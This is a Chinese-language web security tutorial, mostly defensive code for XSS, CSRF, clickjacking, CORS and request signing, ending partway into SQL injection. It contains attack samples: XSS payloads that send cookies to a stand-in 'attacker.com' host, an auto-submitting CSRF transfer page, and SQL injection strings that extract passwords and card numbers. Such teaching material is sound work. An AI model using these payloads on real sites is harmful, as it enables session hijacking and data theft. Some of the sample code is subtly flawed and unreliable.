# Web安全防护完全指南

## 概述

Web安全是全栈开发中不可或缺的重要组成部分。随着Web应用的复杂性不断增加，安全威胁也日益严峻。本指南将从多个维度全面解析Web安全知识，包括前端安全、后端安全、认证授权、HTTPS与TLS、渗透测试基础以及实战演练。通过学习本指南，你将掌握识别和防御常见Web安全威胁的能力，构建安全可靠的Web应用。

现代Web安全防护是一个多层次的系统工程，需要从客户端、服务端、网络通信等多个层面进行综合防护。单纯依靠某一层面的安全措施是远远不够的，攻击者往往通过寻找系统中最薄弱的环节来实施攻击。因此，本指南强调纵深防御理念，即在系统的各个环节都部署相应的安全措施，即使某一层被突破，其他层仍然能够提供保护。

---

## 第一部分：前端安全

前端安全主要涉及客户端代码的安全问题。由于前端代码运行在用户的浏览器中，攻击者可以直接查看和修改前端代码，这使得前端安全面临独特的挑战。前端安全的目标是保护用户免受恶意脚本、钓鱼攻击、界面劫持等威胁的侵害。

### 1.1 XSS跨站脚本攻击

XSS（Cross-Site Scripting，跨站脚本攻击）是Web应用中最为常见的安全漏洞之一。XSS攻击允许攻击者在受害者的浏览器中执行恶意JavaScript代码，从而窃取会话令牌、劫持用户操作、重定向页面等。根据攻击方式的不同，XSS可以分为三种类型：存储型、反射型和DOM型。

#### 1.1.1 存储型XSS

存储型XSS是最危险的XSS类型之一，其特点是恶意脚本被永久存储在目标服务器的数据库或文件系统中。当用户访问包含恶意内容的页面时，这些脚本会被浏览器执行。典型的攻击场景包括用户评论、论坛帖子、个人资料等用户可输入并存储的内容区域。

存储型XSS的攻击流程相对复杂但破坏力极大。首先，攻击者发现网站存在未进行充分过滤的用户输入点；其次，攻击者将恶意JavaScript代码提交到服务器；然后服务器将这段代码存储在数据库中；此后，任何访问该页面的用户都会自动执行这段恶意代码；最后，攻击者可以通过恶意代码窃取用户的Cookie、会话令牌或其他敏感信息。

```javascript
// 恶意用户提交的内容示例（存储型XSS攻击向量）
// 攻击者在一个博客评论中提交以下内容：
const maliciousContent = `
  <script>
    // 窃取用户Cookie并发送到攻击者服务器
    const stolenData = document.cookie;
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(stolenData));
  </script>
`;

// 这段代码被存储在数据库中
// 当其他用户查看这条评论时，script标签内的代码会自动执行
```

防御存储型XSS的关键是在服务端对所有用户输入进行严格的过滤和转义。输入验证应该采用白名单方式，只允许接收符合预期格式的数据；输出时应对HTML特殊字符进行转义，将`<`转义为`&lt;`，`>`转义为`&gt;`，`"`转义为`&quot;`，`'`转义为`&#x27;`。

#### 1.1.2 反射型XSS

反射型XSS是一种非持久化的攻击方式，恶意脚本作为用户请求的一部分被服务器接收，然后未经转义地包含在响应中返回给用户。这种攻击通常通过URL参数或表单提交实现，攻击者需要诱导用户点击一个包含恶意脚本的链接。

反射型XSS的攻击流程相对简单但欺骗性很强。攻击者构造一个包含恶意脚本的URL，如`https://example.com/search?q=<script>alert('XSS')</script>`；然后通过钓鱼邮件、社交媒体或其他渠道诱导用户点击这个链接；用户点击链接后，浏览器发送请求到服务器；服务器从URL参数中获取搜索关键词但未进行转义就直接返回给浏览器；最后浏览器执行响应中的恶意脚本。

```javascript
// 反射型XSS攻击示例
// 攻击者构造的恶意链接
const maliciousURL = 'https://vulnerable-site.com/search?q=<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">';

// 不安全的服务器端代码（Node.js/Express）
app.get('/search', (req, res) => {
  // 直接将用户输入插入到HTML响应中，没有进行任何转义
  const query = req.query.q;
  res.send(`
    <html>
      <body>
        <h1>搜索结果: ${query}</h1>
        <!-- 恶意脚本会被浏览器执行 -->
      </body>
    </html>
  `);
});

// 安全的做法是对用户输入进行HTML转义
function escapeHtml(text) {
  const htmlEscapes = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return text.replace(/[&<>"'\/]/g, (char) => htmlEscapes[char]);
}

app.get('/search', (req, res) => {
  const query = req.query.q;
  // 对用户输入进行HTML转义后再插入到响应中
  res.send(`
    <html>
      <body>
        <h1>搜索结果: ${escapeHtml(query)}</h1>
      </body>
    </html>
  `);
});
```

反射型XSS的防御重点在于正确编码用户输入。无论是将其存储到数据库还是直接回显到页面，都必须进行适当的编码或转义。此外，使用CSP（内容安全策略）可以有效限制脚本的执行，即使XSS漏洞存在，攻击者也难以执行任意JavaScript代码。

#### 1.1.3 DOM型XSS

DOM型XSS是一种特殊类型的XSS攻击，它完全在客户端执行，不需要服务端的参与。攻击者通过修改页面的DOM环境来执行恶意脚本，这种攻击通常发生在JavaScript代码直接从URL参数或DOM中获取数据并传递给危险函数时。

DOM型XSS的独特之处在于服务端收到的请求看起来完全正常，即使URL中包含恶意脚本，服务端也不会在响应中包含这段脚本。恶意脚本只在浏览器解析HTML的过程中被JavaScript代码动态执行。

```javascript
// DOM型XSS攻击示例
// 不安全的JavaScript代码
// 页面中的JavaScript从URL获取参数并直接写入页面
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
document.getElementById('welcome').innerHTML = '欢迎, ' + name;

// 攻击者构造的恶意URL
// https://example.com/welcome?name=<img src=x onerror="alert('XSS')">
// 当用户访问这个URL时，innerHTML会将恶意的HTML代码插入页面
// 然后img标签的onerror事件被触发执行JavaScript代码

// 安全的做法是使用textContent而不是innerHTML
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
// 使用textContent将用户输入作为纯文本插入，而不是HTML
document.getElementById('welcome').textContent = '欢迎, ' + name;
```

DOM型XSS的防御需要前端开发者具备安全意识，避免使用危险的DOM操作方法。innerHTML、outerHTML、insertAdjacentHTML等方法如果直接插入用户输入，都可能导致XSS攻击。优先使用textContent、innerText等安全方法，或者对输入进行适当的编码处理。

### 1.2 XSS防御策略

#### 1.2.1 内容安全策略CSP

内容安全策略（Content Security Policy，CSP）是一种额外的安全层，用于检测并削弱某些特定类型的攻击，包括XSS和数据注入攻击。CSP通过HTTP响应头告诉浏览器，哪些外部资源可以执行，哪些行为被禁止。开发者可以使用CSP来细粒度地控制页面可以加载和执行的资源。

CSP的工作原理是通过服务器返回的Content-Security-Policy响应头来指定策略规则。浏览器在解析页面时，会根据这些规则检查每个资源加载和脚本执行是否符合策略。只有符合策略的资源才能被加载和执行，这大大限制了XSS攻击的可能性。

```javascript
// CSP响应头配置示例
// Express服务器设置CSP头
app.use((req, res, next) => {
  // 设置严格的CSP策略
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",                    // 默认只允许同源资源
    "script-src 'self' 'nonce-{random}'",    // 只允许同源脚本，并使用nonce
    "style-src 'self' 'nonce-{random}'",      // 只允许同源样式
    "img-src 'self' data: https:",            // 允许同源图片、data URL、HTTPS图片
    "font-src 'self' https://fonts.gstatic.com", // 允许Google字体
    "connect-src 'self' https://api.example.com", // 限制AJAX请求目标
    "frame-ancestors 'none'",                 // 禁止被iframe嵌入
    "form-action 'self'",                     // 表单只能提交到同源
    "base-uri 'self'"                         // 限制base标签的目标
  ].join('; '));
  next();
});

// 动态生成带nonce的脚本标签
function addScriptWithNonce(res, scriptContent) {
  const nonce = crypto.randomBytes(16).toString('base64');
  // 将nonce添加到CSP策略中
  res.setHeader('Content-Security-Policy',
    res.getHeader('Content-Security-Policy')
      .replace('{random}', nonce));
  // 生成带nonce的脚本标签
  return `<script nonce="${nonce}">${scriptContent}</script>`;
}
```

CSP策略指令非常丰富，可以针对不同类型的资源设置不同的加载规则。default-src是默认策略，适用于所有未明确指定类型的资源。script-src控制JavaScript脚本的加载源；style-src控制CSS样式表的加载源；img-src控制图片的加载源；connect-src控制fetch、XMLHttpRequest、WebSocket等连接的目标地址。

```html
<!-- CSP策略示例详解 -->
<!-- 报告URI配置，用于收集违规报告 -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; report-uri /csp-report;">

<!-- script-src指令的多种配置方式 -->
<!-- 'self' - 只允许同源脚本 -->
<!-- 'unsafe-inline' - 允许内联脚本（不推荐，降低安全性）-->
<!-- 'unsafe-eval' - 允许eval等动态代码执行（不推荐）-->
<!-- 'nonce-xxx' - 只允许带有特定nonce值的内联脚本 -->
<!-- 'strict-dynamic' - 允许由带nonce的脚本加载的依赖脚本 -->
<!-- https://example.com - 只允许特定域名的脚本 -->

<!-- 示例：使用nonce保护内联脚本 -->
<!-- 服务器端生成带nonce的页面 -->
<!--
Content-Security-Policy: script-src 'nonce-abc123'
<script nonce="abc123">
  // 只有带正确nonce的内联脚本才会被执行
  console.log('安全执行');
</script>
-->
```

#### 1.2.2 输入输出转义

输入输出转义是防御XSS攻击最基本也是最重要的措施。输入转义在数据进入系统时进行，确保存储到数据库中的数据是安全的；输出转义在数据离开系统时进行，确保返回给浏览器的数据不会触发脚本执行。

输入转义应该采用白名单验证方式，只接受符合预期格式的数据。例如，如果一个字段应该是邮箱地址，就应该验证输入是否符合邮箱格式，而不是尝试过滤所有可能的恶意模式。过滤黑名单中的字符是一种不安全的做法，因为攻击者总是能找到绕过过滤的方法。

```javascript
// 输入验证与转义函数
class InputValidator {
  // 邮箱格式验证（白名单方式）
  static isValidEmail(email) {
    // 使用正则表达式严格验证邮箱格式
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(email) && email.length <= 254;
  }

  // HTML转义函数（输出转义）
  static escapeHtml(unsafeText) {
    // 将所有HTML特殊字符转换为安全的形式
    return unsafeText
      .replace(/&/g, '&amp;')      // 必须首先转义&，避免双重转义
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')     // &#x27; 是单引号的十六进制HTML实体
      .replace(/\//g, '&#x2F;');   // 转义斜杠避免破坏属性值的引号
  }

  // JavaScript转义（用于在JavaScript字符串中插入用户输入）
  static escapeJavaScript(unsafeText) {
    // 转义在JavaScript字符串中需要特殊处理的字符
    return unsafeText
      .replace(/\\/g, '\\\\')      // 反斜杠必须首先转义
      .replace(/"/g, '\\"')
      .replace(/'/g, "\\'")
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\u2028/g, '\\u2028') // 行分隔符
      .replace(/\u2029/g, '\\u2029'); // 段落分隔符
  }

  // URL转义（用于URL参数）
  static escapeUrlParam(unsafeText) {
    return encodeURIComponent(unsafeText);
  }

  // CSS转义（用于在CSS中插入用户输入）
  static escapeCss(unsafeText) {
    // CSS字符串中需要转义的特殊字符
    return unsafeText
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"')
      .replace(/'/g, "\\'")
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r');
  }

  // 过滤危险HTML标签和属性
  static sanitizeHtml(dirtyHtml, allowedTags = [], allowedAttrs = []) {
    // 创建一个DOM解析器来安全地处理HTML
    const { JSDOM } = require('jsdom');
    const window = new JSDOM('').window;
    const DOMPurify = require('dompurify')(window);

    // 配置DOMPurify只允许特定的标签和属性
    return DOMPurify.sanitize(dirtyHtml, {
      ALLOWED_TAGS: allowedTags.length > 0 ? allowedTags : ['b', 'i', 'em', 'strong', 'a'],
      ALLOWED_ATTR: allowedAttrs.length > 0 ? allowedAttrs : ['href', 'title'],
      ALLOW_DATA_ATTR: false, // 不允许data属性
      ADD_ATTR: ['target'],    // 允许target属性
    });
  }
}

// 在Express中使用输入验证
app.post('/register', async (req, res) => {
  const { email, username, password } = req.body;

  // 验证邮箱格式
  if (!InputValidator.isValidEmail(email)) {
    return res.status(400).json({ error: '无效的邮箱格式' });
  }

  // 验证用户名长度和字符
  if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
    return res.status(400).json({ error: '用户名格式不正确' });
  }

  // 密码应该有最小复杂度要求
  if (password.length < 8) {
    return res.status(400).json({ error: '密码长度不足' });
  }

  // 验证通过后继续处理注册逻辑
  // ...
});
```

### 1.3 CSRF跨站请求伪造

CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种利用用户已认证的身份，在用户不知情的情况下执行非预期的操作的攻击方式。与XSS不同，CSRF不直接窃取用户数据，而是利用用户已经建立的会话信任来执行未经授权的操作。

CSRF攻击的成功依赖于几个关键条件：用户已经登录并拥有有效的会话Cookie；攻击者能够诱导用户访问恶意页面；浏览器会自动携带同源Cookie发送请求。攻击者利用这一特性，构造一个自动提交表单或触发特定请求的页面，当用户访问该页面时，请求会被自动发送出去，浏览器会带上用户的Cookie，服务器会认为是合法请求。

#### 1.3.1 CSRF攻击原理

CSRF攻击的流程可以分为以下几个步骤：用户登录目标网站并完成身份认证，服务器返回会话Cookie；用户未退出登录的情况下，访问了攻击者构造的恶意页面；恶意页面中包含自动提交的表单或JavaScript代码，触发对目标网站的请求；浏览器自动携带目标网站的Cookie发送请求；服务器验证Cookie后发现是有效会话，执行了攻击者指定的操作。

```html
<!-- CSRF攻击示例：恶意页面 -->
<!DOCTYPE html>
<html>
<head>
  <title>有趣的图片</title>
</head>
<body>
  <h1>点击查看完整图片</h1>
  <!-- 攻击者构造的隐藏表单，自动提交转账请求 -->
  <form id="csrf-form" action="https://bank.example.com/transfer" method="POST">
    <!-- 攻击参数：转账到攻击者账户 -->
    <input type="hidden" name="to_account" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
    <!-- 攻击参数结束 -->
  </form>

  <script>
    // 页面加载完成后自动提交表单
    // 由于用户已登录，浏览器会携带Cookie发送请求
    document.getElementById('csrf-form').submit();
  </script>

  <!-- 或者使用图片请求方式（GET请求） -->
  <img src="https://bank.example.com/transfer?to_account=attacker&amount=10000"
       style="display:none" onerror="this.remove()">
</body>
</html>
```

#### 1.3.2 CSRF防御策略

防御CSRF攻击的核心是确保请求确实来自用户主动操作，而不是被诱导发送的。有几种常用的防御策略：使用CSRF Token验证请求来源；检查请求头中的Referer或Origin字段；使用SameSite Cookie属性；使用双重提交Cookie模式。

CSRF Token是目前最广泛使用的防御方式。服务器为每个用户会话生成一个唯一的随机Token，并将这个Token嵌入到表单中；当表单提交时，Token会随请求一起发送到服务器；服务器验证Token的有效性，如果Token缺失或不匹配，则拒绝请求。

```javascript
// CSRF Token防御实现

// 1. 生成CSRF Token（服务器端）
const crypto = require('crypto');
const express = require('express');
const cookieParser = require('cookie-parser');

app.use(cookieParser());

// 生成安全的CSRF Token
function generateCSRFToken() {
  // 使用加密安全的随机数生成器
  // 生成32字节的随机数据并转换为十六进制字符串
  return crypto.randomBytes(32).toString('hex');
}

// 中间件：为所有请求生成并传递CSRF Token
app.use((req, res, next) => {
  // 检查是否已有Token，没有则生成新的
  if (!req.cookies.csrfToken) {
    res.cookie('csrfToken', generateCSRFToken(), {
      httpOnly: false,     // 必须为false，让JavaScript可以读取
      secure: true,        // 只在HTTPS连接中发送
      sameSite: 'strict',  // 防止跨站请求
      maxAge: 24 * 60 * 60 * 1000 // 24小时有效期
    });
  }
  next();
});

// 2. 在表单中嵌入CSRF Token
app.get('/transfer', (req, res) => {
  const csrfToken = req.cookies.csrfToken;
  // 生成包含CSRF Token的转账表单
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>转账页面</title></head>
    <body>
      <h1>安全转账</h1>
      <form action="/transfer" method="POST">
        <!-- 隐藏字段存储CSRF Token -->
        <input type="hidden" name="_csrf" value="${csrfToken}">
        <label>收款账户: <input type="text" name="toAccount" required></label><br>
        <label>金额: <input type="number" name="amount" required></label><br>
        <button type="submit">转账</button>
      </form>
    </body>
    </html>
  `);
});

// 3. 验证CSRF Token（中间件）
const csrfProtection = (req, res, next) => {
  // 从请求体、请求头或查询参数中获取Token
  const token = req.body._csrf || req.headers['x-csrf-token'] || req.query._csrf;
  const cookieToken = req.cookies.csrfToken;

  // 验证Token存在且匹配
  if (!token || !cookieToken) {
    return res.status(403).json({ error: 'CSRF验证失败：Token缺失' });
  }

  // 使用timingSafeEqual进行常量时间比较，防止时序攻击
  if (!crypto.timingSafeEqual(Buffer.from(token), Buffer.from(cookieToken))) {
    return res.status(403).json({ error: 'CSRF验证失败：Token无效' });
  }

  // 验证通过，继续处理请求
  next();
};

// 4. 应用CSRF验证中间件
app.post('/transfer', csrfProtection, (req, res) => {
  // CSRF验证通过，处理转账逻辑
  const { toAccount, amount } = req.body;
  // 执行转账操作
  // ...
  res.json({ success: true, message: '转账成功' });
});
```

双重提交Cookie是另一种有效的CSRF防御策略。这种方法不需要在表单中嵌入Token，而是将Token同时放在Cookie和请求头中；服务器比较两者是否匹配来判断请求的真实性。由于浏览器同源策略，攻击者无法读取目标网站的Cookie并将其添加到请求头中。

```javascript
// 双重提交Cookie实现
const doubleSubmitCookie = (req, res, next) => {
  // 生成或获取CSRF Token
  if (!req.cookies.csrfToken) {
    res.cookie('csrfToken', generateCSRFToken(), {
      secure: true,
      httpOnly: true,
      sameSite: 'strict'
    });
  }

  // 验证请求头中的CSRF Token
  const csrfHeader = req.headers['x-csrf-token'] || req.headers['x-xsrf-token'];
  const csrfCookie = req.cookies.csrfToken;

  // 验证两者都存在且相等
  if (!csrfHeader || !csrfCookie || csrfHeader !== csrfCookie) {
    return res.status(403).json({ error: 'CSRF验证失败' });
  }

  next();
};

// 前端在发送请求时添加CSRF头
// 使用axios时的拦截器配置
axios.interceptors.request.use((config) => {
  // 从Cookie中读取CSRF Token（需要确保Cookie不是httpOnly）
  const csrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('csrfToken='))
    ?.split('=')[1];

  if (csrfToken) {
    // 将Token添加到请求头
    config.headers['X-CSRF-Token'] = csrfToken;
  }

  return config;
});
```

### 1.4 点击劫持

点击劫持（Clickjacking）是一种通过透明iframe覆盖正常页面，诱导用户在不知情的情况下点击隐藏页面元素的攻击方式。攻击者将目标网站嵌入到一个透明的iframe中，然后在其上层覆盖一个诱导性的页面（如按钮、奖品等），当用户点击看似正常的按钮时，实际上点击的是被隐藏的目标网站。

#### 1.4.1 X-Frame-Options响应头

X-Frame-Options是防止点击劫持的重要HTTP响应头。它指示浏览器是否应该加载当前页面在frame或iframe中。通过设置这个头，网站可以防止自己被嵌入到其他网站的iframe中。

```javascript
// X-Frame-Options配置
app.use((req, res, next) => {
  // DENY: 完全禁止被任何页面嵌入
  // SAMEORIGIN: 只允许同源页面嵌入
  // ALLOW-FROM uri: 允许指定来源的页面嵌入（已废弃，浏览器支持有限）
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  next();
});

// Express中更细粒度的控制
app.get('/sensitive-action', (req, res) => {
  // 对于敏感操作页面，完全禁止被嵌入
  res.setHeader('X-Frame-Options', 'DENY');
  res.send(/* ... */);
});
```

#### 1.4.2 Frame-Busting脚本

虽然X-Frame-Options是防御点击劫持的标准方法，但一些旧浏览器不支持此头，因此可以使用JavaScript的frame-busting代码作为补充防御。frame-busting代码检测页面是否被嵌入iframe中，如果是则采取相应措施。

```html
<!-- Frame-Busting代码示例 -->
<!-- 标准frame-busting实现 -->
<style>
  /* 使用CSS确保页面不以任何方式被嵌入 */
  html { display: none; }
</style>
<script>
  // 检测页面是否被嵌入iframe
  if (self === top) {
    // 未被嵌入，显示页面
    document.documentElement.style.display = 'block';
  } else {
    // 被嵌入iframe中，可能遭受点击劫持攻击
    // 采取措施：跳出iframe
    top.location = self.location;
  }
</script>

<!-- 更强壮的frame-busting实现 -->
<script>
  (function() {
    // 防御点击劫持的立即执行函数
    var防止被嵌入 = function() {
      // 检查当前窗口是否是顶层窗口
      if (window.parent !== window.self) {
        try {
          // 尝试修改父窗口的URL跳转
          // 如果同源，这会成功；如果不同源，会抛出安全错误
          window.parent.location.href = window.self.location.href;
        } catch (e) {
          // 捕获安全错误，说明非同源，页面可能被攻击
          // 强制跳出iframe
          window.location.href = 'about:blank';
        }
      }
    };

    // 页面加载时和状态改变时都进行检查
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', 防止被嵌入);
    } else {
      防止被嵌入();
    }
  })();
</script>
```

### 1.5 JSONP安全

JSONP（JSON with Padding）是一种历史悠久的跨域数据传输技术，它利用script标签可以跨域加载资源的特性来实现数据获取。然而，JSONP存在严重的安全问题，现代应用应该避免使用JSONP，改用CORS。

JSONP的安全问题主要体现在以下几个方面：JSONP响应执行JavaScript代码，任何恶意代码都会被执行；JSONP无法验证响应来源，容易遭受XSS攻击；JSONP请求自动携带Cookie，存在CSRF风险。

```javascript
// 不安全的JSONP实现
app.get('/jsonp', (req, res) => {
  const callback = req.query.callback;
  const data = { message: 'Hello' };

  // 直接将用户输入作为函数调用，存在严重安全问题
  // 攻击者可以构造恶意请求：/jsonp?callback=alert('XSS')
  res.send(`${callback}(${JSON.stringify(data)})`);
});

// 如果必须使用JSONP（不推荐），必须进行严格验证
app.get('/jsonp-secure', (req, res) => {
  const callback = req.query.callback;
  const data = { message: 'Hello' };

  // 严格验证callback参数，只允许字母、数字和下划线
  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(callback)) {
    return res.status(400).send('Invalid callback');
  }

  // 验证数据不包含恶意内容
  // ...

  res.send(`${callback}(${JSON.stringify(data)})`);
});

// 强烈推荐：使用CORS代替JSONP
app.get('/cors-data', (req, res) => {
  // 设置CORS头
  res.setHeader('Access-Control-Allow-Origin', 'https://trusted-site.com');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
  res.json({ message: 'Hello' });
});
```

### 1.6 CORS配置安全

跨域资源共享（Cross-Origin Resource Sharing，CORS）是一种基于HTTP头的机制，允许服务器指定哪些来源可以访问其资源。正确配置CORS对于Web应用的安全性至关重要。

CORS配置中最重要的是Access-Control-Allow-Origin头。这个头指定了哪些来源被允许访问资源。如果设置为`*`，则任何网站都可以访问资源，这对于public数据可能是可以接受的，但如果涉及敏感数据，则必须限制为特定的信任来源。

```javascript
// CORS安全配置示例
const express = require('express');
const app = express();

// 定义可信的来源列表
const ALLOWED_ORIGINS = [
  'https://example.com',
  'https://www.example.com',
  'https://app.example.com'
];

// CORS中间件配置
app.use((req, res, next) => {
  const origin = req.headers.origin;

  // 检查请求来源是否在白名单中
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    res.setHeader('Access-Control-Max-Age', '86400'); // 预检请求缓存24小时
  }

  // 处理预检请求
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }

  next();
});

// 动态CORS配置（根据路由）
app.get('/public-data', (req, res) => {
  // 公共数据可以允许所有来源
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.json({ data: 'Public data' });
});

app.get('/private-data', (req, res) => {
  // 私有数据只允许特定来源，并要求凭证
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.json({ data: 'Private data' });
  } else {
    res.status(403).json({ error: 'Forbidden' });
  }
});
```

### 1.7 前端加密与接口签名

前端加密在Web安全中扮演着重要角色，但需要明确的是，前端加密不能替代HTTPS传输加密。前端加密主要用于防止敏感数据在传输过程中被中间人查看，以及用于接口签名来验证请求的完整性和来源。

#### 1.7.1 密码加密

前端不应该传输明文密码，即使使用HTTPS也应该在前端对密码进行初步处理。但这并不意味着前端要"加密"密码（因为加密密钥会暴露在前端代码中），而是应该进行哈希处理，这样即使用户在不同网站使用相同密码，也不会被轻易识别。

```javascript
// 前端密码处理
// 使用Web Crypto API进行哈希处理
async function hashPassword(password) {
  // 将密码字符串转换为ArrayBuffer
  const encoder = new TextEncoder();
  const data = encoder.encode(password);

  // 使用SHA-256哈希算法
  // 注意：这只是初步处理，实际安全传输仍需HTTPS
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);

  // 转换为十六进制字符串
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');

  return hashHex;
}

// 使用bcrypt进行更安全的密码哈希（需要加载bcryptjs库）
// 注意：bcrypt的计算成本使得它不适合在前端执行
// 下面的代码仅作为演示，实际应该在后端执行bcrypt
async function demonstrateBcrypt() {
  // 加载bcryptjs库
  const bcrypt = require('bcryptjs');

  const password = 'userPassword123';
  const saltRounds = 10;

  // 在后端进行哈希处理
  const hash = await bcrypt.hash(password, saltRounds);

  // 验证密码
  const isValid = await bcrypt.compare(password, hash);

  return { hash, isValid };
}

// 前端发送密码进行后端验证
async function loginWithPassword(username, password) {
  // 对密码进行初步处理
  const hashedPassword = await hashPassword(password);

  // 通过HTTPS发送到服务器
  const response = await fetch('/api/login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    credentials: 'include', // 包含HTTP-only Cookie
    body: JSON.stringify({
      username,
      password: hashedPassword // 发送哈希后的密码
    })
  });

  return response.json();
}
```

#### 1.7.2 接口签名

接口签名用于验证请求的完整性和来源，防止请求被篡改或重放攻击。签名通常包含时间戳、随机数等元素，以防止重放攻击。

```javascript
// 接口签名实现

// 签名密钥（实际应用中应从环境变量或配置中心获取）
const SECRET_KEY = 'your-secret-key-for-signing';

// 生成签名
function generateSignature(method, path, timestamp, nonce, body) {
  // 构造签名字符串：方法 + 路径 + 时间戳 + 随机数 + 请求体
  const signString = [
    method.toUpperCase(),
    path,
    timestamp,
    nonce,
    body ? JSON.stringify(body) : ''
  ].join('|');

  // 使用HMAC-SHA256算法生成签名
  const signature = crypto
    .createHmac('sha256', SECRET_KEY)
    .update(signString)
    .digest('hex');

  return signature;
}

// 验证签名（服务器端）
function verifySignature(req, res, next) {
  const timestamp = req.headers['x-timestamp'];
  const nonce = req.headers['x-nonce'];
  const signature = req.headers['x-signature'];

  // 验证时间戳，防止重放攻击（5分钟内的请求有效）
  const now = Date.now();
  if (Math.abs(now - parseInt(timestamp)) > 5 * 60 * 1000) {
    return res.status(401).json({ error: '请求已过期' });
  }

  // 验证随机数，防止重放攻击
  // 需要在服务器端存储已使用的随机数
  if (usedNonces.has(nonce)) {
    return res.status(401).json({ error: '重复请求' });
  }

  // 验证签名
  const expectedSignature = generateSignature(
    req.method,
    req.path,
    timestamp,
    nonce,
    req.body
  );

  if (!crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSignature))) {
    return res.status(401).json({ error: '签名验证失败' });
  }

  // 记录使用的随机数
  usedNonces.add(nonce);
  // 清理过期的随机数记录
  setTimeout(() => usedNonces.delete(nonce), 10 * 60 * 1000);

  next();
}

// 前端请求拦截器添加签名
axios.interceptors.request.use((config) => {
  const timestamp = Date.now().toString();
  const nonce = crypto.randomBytes(16).toString('hex');

  // 添加签名相关的请求头
  config.headers['X-Timestamp'] = timestamp;
  config.headers['X-Nonce'] = nonce;
  config.headers['X-Signature'] = generateSignature(
    config.method,
    config.url,
    timestamp,
    nonce,
    config.data
  );

  return config;
});
```

---

## 第二部分：后端安全

后端安全是Web应用安全的核心防线。与前端安全不同，后端代码运行在服务器上，攻击者无法直接访问和修改。后端安全的主要目标是保护服务器、数据库和应用程序免受各种攻击，如SQL注入、命令注入、文件上传漏洞等。

### 2.1 SQL注入

SQL注入是Web安全中最危险也是最常见的漏洞之一。攻击者通过在用户输入中注入恶意的SQL语句，从而绕过认证、获取敏感数据、甚至执行系统命令。SQL注入的发生主要是因为程序将用户输入直接拼接到SQL语句中，而不是使用参数化查询。

#### 2.1.1 SQL注入原理

SQL注入攻击的本质是打破数据与代码的边界。正常情况下，用户输入被当作数据处理；而在存在SQL注入漏洞的情况下，用户输入被当作SQL代码执行。攻击者利用应用程序对输入验证的不完善，通过构造特殊的输入来改变SQL语句的逻辑。

```sql
-- 正常的登录查询
SELECT * FROM users WHERE username = 'john' AND password = 'secret123'

-- SQL注入：绕过认证
-- 用户名输入: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''

-- 攻击分析：'1'='1'永远为真，这条SQL会返回所有用户记录
-- 如果程序逻辑是检查返回记录数>0，攻击者就能以第一个用户身份登录

-- 联合查询注入：获取其他表的数据
-- 用户名输入: ' UNION SELECT credit_card_number FROM payment_cards --
SELECT * FROM users WHERE username = '' UNION SELECT credit_card_number FROM payment_cards --' AND password = ''

-- --是SQL的注释符，后面的内容被忽略
```

#### 2.1.2 SQL注入类型

联合查询注入是最常见的SQL注入类型，攻击者使用UNION语句将恶意查询与原查询合并，从而获取额外的数据。这种攻击要求攻击者对数据库结构有一定了解，并且原查询的列数和数据类型要与UNION后的查询匹配。

```javascript
// 联合查询注入示例
// 不安全的代码
app.get('/search', (req, res) => {
  const category = req.query.category;
  // 直接将用户输入拼接到SQL中
  const query = `SELECT * FROM products WHERE category = '${category}'`;
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// 恶意请求
// /search?category=' UNION SELECT username, password FROM users --

// 攻击后的SQL
// SELECT * FROM products WHERE category = '' UNION SELECT username, password FROM users --'

// 使用UNION时需要匹配列数
// 假设products表有4列，攻击者需要构造4列的查询
// /search?category=' UNION SELECT NULL, username, password, NULL FROM users --
```

布尔盲注是一种更隐蔽的SQL注入方式。当应用程序不会返回具体的错误信息或查询结果时，攻击者无法直接获取数据，但可以通过观察页面响应是否发生变化来判断条件真假，从而逐步推断出数据。

```javascript
// 布尔盲注示例
// 不安全的代码
app.get('/user', (req, res) => {
  const userId = req.query.id;
  // 只返回用户存在与否，不返回具体数据
  const query = `SELECT COUNT(*) as count FROM users WHERE id = ${userId}`;
  db.query(query, (err, results) => {
    if (results[0].count > 0) {
      res.send('用户存在');
    } else {
      res.send('用户不存在');
    }
  });
});

